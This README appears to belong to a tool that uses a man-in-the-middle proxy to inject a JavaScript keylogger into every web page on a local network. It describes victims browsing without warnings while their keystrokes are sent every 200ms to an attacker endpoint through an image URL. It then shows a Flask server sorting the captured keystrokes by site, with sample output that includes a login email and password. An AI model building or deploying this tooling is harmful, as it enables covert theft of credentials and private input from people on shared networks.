# mitm-proxy
Using a MITM proxy to add a browser-based keylogger to devices on your local network

# How does it work?

This works by injecting the following Javascript code into every request that takes place on the network.

<p align="center">
<img width=700px src ="static/code.png">
</p>

## Client Side

The unsuspecting user browses the web normally without experiencing any warnings/interuptions.

<p align="center">
<img width=500px src ="static/demo.gif">
</p>

Every 200ms, the client loads an "image" hosted at:

```
http://{ENDPOINT}/?c=[{"k":{KEY_PRESS},"t":{TIME_STAMP},"w":{HOSTNAME}}]
```

## Server Side

When the client reloads the image, a GET request is made to our Flask application.  We get the URL-encoded JSON object from the "c" query parameter, and it gives us something like this:

```javascript
[
    {
        "k": "t",
        "t": 186207233,
        "w": "www.ebay.com"
    },
    {
        "k": "r",
        "t": 186207235,
        "w": "www.ebay.com"
    },
    {
        "k": "t",
        "t": 186207238,
        "w": "www.ebay.com"
    }
]
```

Occasionally these keystrokes will not be in order, so we sort them by timestamp using the values in "t".

On the server side, we have logic that categorizes the keystrokes by the hostname of the site the request is sent from.  We save the keystrokes by hostname in the root directory of the project.

```bash
$ cat www.ebay.com
raspberry piEnteraphone casesEnter9400Backspace30
```

```bash
$ cat signin.ebay.com
totallynotarealemail@gmail.comfakepasswordEnter
```
